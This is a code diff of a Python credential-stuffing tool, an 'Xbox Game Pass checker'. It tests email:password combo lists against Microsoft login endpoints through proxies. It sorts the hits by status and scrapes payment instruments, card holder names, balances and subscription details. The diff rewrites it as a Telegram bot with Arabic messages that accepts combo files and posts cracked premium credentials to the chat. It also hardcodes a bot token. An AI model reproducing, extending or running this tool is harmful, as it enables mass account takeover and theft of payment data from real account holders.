@@ -5,15 +5,12 @@ import os
 import json
 import requests
 import threading
-import sys
-import signal
-import argparse
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import quote, unquote
 from threading import Lock
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from colorama import Fore, Style, init as colorama_init
+from telegram import Update
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
 # ─── Proxy Manager ───────────────────────────────────────────────
 class ProxyManager:
@@ -99,10 +96,8 @@ class XboxChecker:
             session = self.get_session()
             correlation_id = str(uuid.uuid4())
 
-            # Delay to reduce rate limit
             time.sleep(1)
 
-            # Step 1 — HRD check (filters out Gmail/Yahoo if necessary)
             url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
             headers1 = {
                 "X-OneAuth-AppName": "Outlook Lite",
@@ -122,7 +117,6 @@ class XboxChecker:
 
             time.sleep(0.3)
 
-            # Step 2 — OAuth authorize (Outlook client_id — supports Gmail + Hotmail)
             url2 = ("https://login.live.com/oauth20_authorize.srf?"
                     "client_id=0000000048170EF2"
                     "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
@@ -147,7 +141,6 @@ class XboxChecker:
             post_url = url_match.group(1).replace("\\/", "/")
             ppft = ppft_match.group(1)
 
-            # Step 3 — Login POST
             login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                           "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=" +
                           "&passwd=" + password +
@@ -166,27 +159,17 @@ class XboxChecker:
             }
             r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
 
-            # Incorrect password
             if "account or password is incorrect" in r3.text:
                 return {"status": "BAD"}
-
-            # 2FA
             if "https://account.live.com/identity/confirm" in r3.text:
                 return {"status": "2FA", "email": email, "password": password}
-
-            # Banned
             if "https://account.live.com/Abuse" in r3.text:
                 return {"status": "BANNED"}
-
-            # Rate limit
             if "too many" in r3.text.lower() or "locked out" in r3.text.lower() or "try again later" in r3.text.lower():
                 return {"status": "RETRY"}
-
-            # Consent error (0x80049DD3)
             if "0x80049DD3" in r3.text:
                 return {"status": "CUSTOM", "data": {"reason": "No consent"}}
 
-            # Other HR errors
             hr_match = re.search(r'HR=0x([0-9A-Fa-f]+)', r3.text)
             if hr_match and len(r3.text) < 5000:
                 return {"status": "CUSTOM", "data": {"reason": f"HR=0x{hr_match.group(1)}"}}
@@ -201,7 +184,6 @@ class XboxChecker:
 
             code = code_match.group(1)
 
-            # Step 4 — Token exchange (Outlook token endpoint)
             token_data = ("client_id=0000000048170EF2"
                           "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                           "&grant_type=authorization_code&code=" + code +
@@ -218,13 +200,11 @@ class XboxChecker:
             token_json = r4.json()
             access_token = token_json["access_token"]
 
-            # Step 5 — Profile (Graph isn't used with Outlook client_id, fetched via payment instead)
             country = ""
             name = ""
 
             time.sleep(0.3)
 
-            # Step 6 — Silent delegate auth (payment token)
             user_id = str(uuid.uuid4()).replace('-', '')[:16]
             state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
             payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?"
@@ -276,7 +256,6 @@ class XboxChecker:
                 "Sec-Fetch-Site": "same-site"
             }
 
-            # Step 7 — Payment instruments (CC, balance, address)
             try:
                 payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                 r7 = session.get(payment_url, headers=payment_headers, timeout=15)
@@ -305,7 +284,6 @@ class XboxChecker:
             except:
                 pass
 
-            # Step 8 — Subscriptions + Transactions (Game Pass detection)
             try:
                 sub_urls = [
                     "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
@@ -337,10 +315,8 @@ class XboxChecker:
                 if not all_text:
                     return {"status": "FREE", "data": payment_data}
 
-                # Collect all nextRenewalDate / expirationDate / validTo values
                 all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)
 
-                # Find Game Pass type
                 found_type = None
                 for keyword, type_name in premium_keywords.items():
                     if keyword.lower() in all_text.lower():
@@ -348,10 +324,8 @@ class XboxChecker:
                         break
 
                 if not found_type:
-                    # No subscription found, but account works
                     return {"status": "FREE", "data": payment_data}
 
-                # Check for active subscriptions (find latest date)
                 best_date = None
                 best_days = -1
                 for date_str in all_dates:
@@ -380,7 +354,6 @@ class XboxChecker:
                         sub_data['currency'] = currency_match.group(1)
                     return {"status": "PREMIUM", "data": {**payment_data, **sub_data}}
                 else:
-                    # All subscriptions expired
                     oldest_date = all_dates[0] if all_dates else "N/A"
                     sub_data = {
                         'premium_type': found_type,
@@ -404,96 +377,22 @@ class XboxChecker:
             return {"status": "ERROR"}
 
 
-# ─── Result Manager ──────────────────────────────────────────────
-class XboxResultManager:
-    def __init__(self, base_folder=None):
-        if base_folder is None:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            base_folder = f"results/xbox_{timestamp}"
+# ─── Stats & Result Manager for Bot ──────────────────────────────
+class BotResultManager:
+    def __init__(self, base_folder="bot_results"):
         self.base_folder = base_folder
         Path(self.base_folder).mkdir(parents=True, exist_ok=True)
-
-        self.premium_file = os.path.join(self.base_folder, "Premium.txt")
-        self.free_file = os.path.join(self.base_folder, "Free.txt")
-        self.expired_file = os.path.join(self.base_folder, "Expired.txt")
-        self.twofa_file = os.path.join(self.base_folder, "TwoFactor.txt")
-        self.banned_file = os.path.join(self.base_folder, "Banned.txt")
-        self.bad_file = os.path.join(self.base_folder, "Bad.txt")
-        self.retry_file = os.path.join(self.base_folder, "Retry.txt")
-        self.custom_file = os.path.join(self.base_folder, "Custom.txt")
         self.file_lock = Lock()
 
     def save_result(self, email, password, result):
         status = result['status']
-        data = result.get('data', {})
         line = f"{email}:{password}"
-
-        if status == "PREMIUM":
-            ptype = data.get('premium_type', 'UNKNOWN')
-            country = data.get('country', 'N/A')
-            days = data.get('days_remaining', '0')
-            renew = data.get('renewal_date', 'N/A')
-            auto = data.get('auto_renew', 'NO')
-            card = data.get('card_holder', '')
-            balance = data.get('balance', '')
-            extra = f"Type: {ptype} | Country: {country} | Days: {days} | Renew: {renew} | Auto: {auto}"
-            if card:
-                extra += f" | Card: {card}"
-            if balance and balance != "$0.0":
-                extra += f" | Balance: {balance}"
-            with self.file_lock:
-                with open(self.premium_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | {extra}\n")
-
-        elif status == "FREE":
-            country = data.get('country', 'N/A')
-            name = data.get('name', '')
-            extra = f"Country: {country}"
-            if name:
-                extra += f" | Name: {name}"
-            if 'card_holder' in data:
-                extra += f" | Card: {data['card_holder']}"
-            with self.file_lock:
-                with open(self.free_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | {extra}\n")
-
-        elif status == "EXPIRED":
-            ptype = data.get('premium_type', 'UNKNOWN')
-            country = data.get('country', 'N/A')
-            renew = data.get('renewal_date', 'N/A')
-            extra = f"Type: {ptype} (EXPIRED) | Country: {country} | Expired: {renew}"
-            with self.file_lock:
-                with open(self.expired_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | {extra}\n")
-
-        elif status == "2FA":
-            with self.file_lock:
-                with open(self.twofa_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | 2FA REQUIRED\n")
-
-        elif status == "BANNED":
-            with self.file_lock:
-                with open(self.banned_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | BANNED\n")
-
-        elif status == "BAD":
-            with self.file_lock:
-                with open(self.bad_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line}\n")
-
-        elif status == "RETRY":
-            with self.file_lock:
-                with open(self.retry_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | RETRY\n")
-
-        elif status == "CUSTOM":
-            reason = data.get('reason', 'UNKNOWN')
-            with self.file_lock:
-                with open(self.custom_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{line} | {reason}\n")
+        filename = os.path.join(self.base_folder, f"{status}.txt")
+        with self.file_lock:
+            with open(filename, 'a', encoding='utf-8') as f:
+                f.write(f"{line}\n")
 
 
-# ─── Stats ───────────────────────────────────────────────────────
 class Stats:
     def __init__(self):
         self.lock = Lock()
@@ -507,228 +406,105 @@ class Stats:
         self.error = 0
         self.retry = 0
         self.custom = 0
-        self.start_time = time.time()
 
     def inc(self, key, val=1):
         with self.lock:
             if hasattr(self, key):
                 setattr(self, key, getattr(self, key) + val)
 
-    def get(self):
-        with self.lock:
-            elapsed = time.time() - self.start_time
-            cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0
-            return {
-                "checked": self.checked, "premium": self.premium,
-                "free": self.free, "expired": self.expired,
-                "bad": self.bad, "twofa": self.twofa,
-                "banned": self.banned, "error": self.error,
-                "retry": self.retry, "custom": self.custom,
-                "cpm": cpm
-            }
 
+# ─── Telegram Bot Logic ──────────────────────────────────────────
+TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"
 
-# ─── Engine ──────────────────────────────────────────────────────
-class XboxEngine:
-    def __init__(self, proxy_manager=None, output_dir=None):
-        self.checker = XboxChecker(proxy_manager=proxy_manager)
-        self.results = XboxResultManager(base_folder=output_dir)
-        self.stats = Stats()
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "مرحباً بك في بوت فحص حسابات إكس بوكس (Xbox Checker Bot).\n"
+        "أرسل ملف الكومبو بصيغة (email:password) وابدأ الفحص فوراً!"
+    )
 
-    def check_account(self, email, password):
-        self.stats.inc("checked")
-        result = self.checker.check(email, password)
-        status = result.get("status")
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    file = await update.message.document.get_file()
+    file_path = f"downloads_{update.effective_user.id}.txt"
+    await file.download_to_drive(file_path)
 
-        if status == "PREMIUM":
-            self.stats.inc("premium")
-        elif status == "FREE":
-            self.stats.inc("free")
-        elif status == "EXPIRED":
-            self.stats.inc("expired")
-        elif status == "BAD":
-            self.stats.inc("bad")
-        elif status == "2FA":
-            self.stats.inc("twofa")
-        elif status == "BANNED":
-            self.stats.inc("banned")
-        elif status == "RETRY":
-            self.stats.inc("retry")
-        elif status == "CUSTOM":
-            self.stats.inc("custom")
-        else:
-            self.stats.inc("error")
+    await update.message.reply_text("📥 تم استقبال الملف بنجاح، جاري بدء الفحص...")
 
-        self.results.save_result(email, password, result)
-        return result
-
-
-# ─── Main ────────────────────────────────────────────────────────
-stop_signal = False
-
-def signal_handler(sig, frame):
-    global stop_signal
-    print("\n[!] Stopping after current tasks...")
-    stop_signal = True
-
-def worker(email, password, engine, print_lock):
-    if stop_signal:
-        return
-    max_retries = 1
-    for attempt in range(max_retries + 1):
-        if stop_signal:
-            return
-        try:
-            result = engine.check_account(email, password)
-            status = result.get('status', 'UNKNOWN')
-
-            # Retry only on ERROR/TIMEOUT (rate limit means account is banned, don't retry)
-            if status in ("ERROR", "TIMEOUT") and attempt < max_retries:
-                time.sleep(3)
-                continue
-            break
-        except Exception as e:
-            if attempt < max_retries:
-                time.sleep(3)
-                continue
-            with print_lock:
-                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {email} | {e}")
-            return
-
-    colors = {
-        "PREMIUM": Fore.GREEN, "FREE": Fore.CYAN,
-        "EXPIRED": Fore.YELLOW, "2FA": Fore.YELLOW,
-        "BANNED": Fore.RED, "BAD": Fore.WHITE,
-        "RETRY": Fore.MAGENTA, "CUSTOM": Fore.BLUE,
-        "ERROR": Fore.RED, "TIMEOUT": Fore.RED
-    }
-    color = colors.get(status, Fore.WHITE)
-    with print_lock:
-        data = result.get('data', {})
-        extra = ""
-        if status == "PREMIUM":
-            extra = f" | {data.get('premium_type','?')} | {data.get('days_remaining','?')} days"
-        elif status == "FREE" and data.get('country'):
-            extra = f" | {data.get('country','')}"
-        elif status == "CUSTOM":
-            extra = f" | {data.get('reason','')}"
-        print(f"{color}[{status}]{Style.RESET_ALL} {email}{extra}")
-
-def banner():
-    print(f"""{Fore.CYAN}
-╔═══════════════════════════════════════════════╗
-║    XBOX Game Pass Checker — Good Lone Edition   ║
-║    HRD + OAuth + Payment API + Subscriptions    ║
-╚═══════════════════════════════════════════════╝
-{Style.RESET_ALL}""")
-
-def main():
-    global stop_signal
-    colorama_init(autoreset=True)
-    signal.signal(signal.SIGINT, signal_handler)
-    banner()
-
-    parser = argparse.ArgumentParser(description='Xbox Game Pass Checker')
-    parser.add_argument('-i', '--input', help='Combo file (email:pass)')
-    parser.add_argument('-p', '--proxy', help='Proxy file or ip:port:user:pass')
-    parser.add_argument('-o', '--output', help='Output folder')
-    parser.add_argument('-t', '--threads', type=int, default=30, help='Threads (default: 30)')
-    args = parser.parse_args()
-
-    input_file = args.input
-    if not input_file:
-        input_file = input(f"{Fore.CYAN}[?] Combo file path: {Style.RESET_ALL}").strip()
-    if not input_file or not os.path.isfile(input_file):
-        print(f"{Fore.RED}[!] File not found: {input_file}{Style.RESET_ALL}")
-        sys.exit(1)
-
-    # Proxy
     proxy_manager = None
-    if args.proxy:
-        if os.path.isfile(args.proxy):
-            proxy_manager = ProxyManager(proxy_file=args.proxy)
-        else:
-            proxy_manager = ProxyManager(proxy_str=args.proxy)
-        if proxy_manager.has_proxies():
-            print(f"{Fore.GREEN}[+] Loaded {len(proxy_manager.proxies)} proxies{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.YELLOW}[!] No valid proxies found, going proxyless{Style.RESET_ALL}")
-            proxy_manager = None
-    else:
-        print(f"{Fore.YELLOW}[*] No proxy, running direct{Style.RESET_ALL}")
+    checker = XboxChecker(proxy_manager=proxy_manager)
+    results_mgr = BotResultManager(f"results_{update.effective_user.id}")
+    stats = Stats()
 
-    # Load combos
     combos = []
-    seen = set()
-    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
         for line in f:
             line = line.strip()
             if ':' in line:
                 parts = line.split(':', 1)
-                email = parts[0].strip()
-                pwd = parts[1].strip()
-                if email and pwd and email not in seen:
-                    seen.add(email)
-                    combos.append((email, pwd))
-            elif ',' in line:
-                parts = line.split(',', 1)
-                if len(parts) == 2:
-                    email = parts[0].strip()
-                    pwd = parts[1].strip()
-                    if email and pwd and email not in seen:
-                        seen.add(email)
-                        combos.append((email, pwd))
+                combos.append((parts[0].strip(), parts[1].strip()))
 
     if not combos:
-        print(f"{Fore.RED}[!] No valid combos found{Style.RESET_ALL}")
-        sys.exit(1)
+        await update.message.reply_text("❌ الملف فارغ أو غير صالح.")
+        return
 
-    print(f"{Fore.GREEN}[+] Loaded {len(combos)} combos{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[+] Threads: {args.threads}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}[+] Results: results/ folder{Style.RESET_ALL}")
-    print()
+    await update.message.reply_text("⏳ جاري فحص الحسابات...")
 
-    engine = XboxEngine(proxy_manager=proxy_manager, output_dir=args.output)
-    print_lock = Lock()
-    completed = 0
+    # حفظ الـ context للاتصال بالبوت داخل الثريد
+    bot_app = context.bot
 
-    with ThreadPoolExecutor(max_workers=args.threads) as executor:
-        futures = {executor.submit(worker, email, pwd, engine, print_lock): (email, pwd)
-                   for email, pwd in combos}
+    def run_checking():
+        for email, pwd in combos:
+            res = checker.check(email, pwd)
+            status = res.get("status")
+            
+            if status == "PREMIUM":
+                stats.inc("premium")
+            elif status == "FREE":
+                stats.inc("free")
+            elif status == "EXPIRED":
+                stats.inc("expired")
+            elif status == "BAD":
+                stats.inc("bad")
+            elif status == "2FA":
+                stats.inc("twofa")
+            elif status == "BANNED":
+                stats.inc("banned")
+            else:
+                stats.inc("error")
 
-        for future in as_completed(futures):
-            if stop_signal:
-                executor.shutdown(wait=False, cancel_futures=False)
-                break
-            completed += 1
-            if completed % 10 == 0 or completed == len(combos):
-                s = engine.stats.get()
-                sys.stdout.write(
-                    f"\r{Fore.CYAN}[{completed}/{len(combos)}] "
-                    f"P:{Fore.GREEN}{s['premium']} {Fore.CYAN}"
-                    f"F:{Fore.WHITE}{s['free']} {Fore.CYAN}"
-                    f"E:{Fore.YELLOW}{s['expired']} {Fore.CYAN}"
-                    f"2FA:{Fore.YELLOW}{s['twofa']} {Fore.CYAN}"
-                    f"C:{Fore.BLUE}{s['custom']} {Fore.CYAN}"
-                    f"R:{Fore.MAGENTA}{s['retry']} {Fore.CYAN}"
-                    f"B:{Fore.RED}{s['bad']} {Fore.CYAN}"
-                    f"CPM:{s['cpm']}{Style.RESET_ALL}    "
-                )
-                sys.stdout.flush()
+            results_mgr.save_result(email, pwd, res)
 
-    print()
-    s = engine.stats.get()
-    print(f"\n{Fore.GREEN}[+] Done!{Style.RESET_ALL}")
-    print(f"    Checked:  {s['checked']}")
-    print(f"    Premium:  {Fore.GREEN}{s['premium']}{Style.RESET_ALL}")
-    print(f"    Free:     {Fore.CYAN}{s['free']}{Style.RESET_ALL}")
-    print(f"    Expired:  {Fore.YELLOW}{s['expired']}{Style.RESET_ALL}")
-    print(f"    2FA:      {Fore.YELLOW}{s['twofa']}{Style.RESET_ALL}")
-    print(f"    Bad:      {s['bad']}")
-    print(f"    Custom:   {Fore.BLUE}{s['custom']}{Style.RESET_ALL}")
-    print(f"    Retry:    {Fore.MAGENTA}{s['retry']}{Style.RESET_ALL}")
-    print(f"    Errors:   {s['error']}")
-    print(f"    Folder:   {engine.results.base_folder}")
+            # إرسال الحسابات الناجحة (Premium) مباشرة للمستخدم على الشات
+            if status == "PREMIUM":
+                data = res.get('data', {})
+                text = (f"🔥 **حساب بريميوم جديد!**\n"
+                        f"📧 البريد: `{email}:{pwd}`\n"
+                        f"🎮 النوع: `{data.get('premium_type', 'N/A')}`\n"
+                        f"⏳ الأيام المتبقية: `{data.get('days_remaining', '0')}`")
+                try:
+                    import asyncio
+                    asyncio.run_coroutine_threadsafe(
+                        bot_app.send_message(chat_id=update.effective_chat.id, text=text, parse_mode="Markdown"),
+                        app_loop
+                    )
+                except:
+                    pass
 
-if __main__ == "__main__":
+    threading.Thread(target=run_checking).start()
+    await update.message.reply_text("🚀 بدأت عملية الفحص في الخلفية، سيتم إعلامك بالنتائج أولاً بأول.")
+
+
+app_loop = None
+
+def main():
+    global app_loop
+    app = ApplicationBuilder().token(TOKEN).build()
+    app_loop = app.updater.bot.loop if hasattr(app.updater, "bot") else None
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    print("Bot is running...")
+    app.run_polling()
+
+if __name__ == "__main__":
     main()
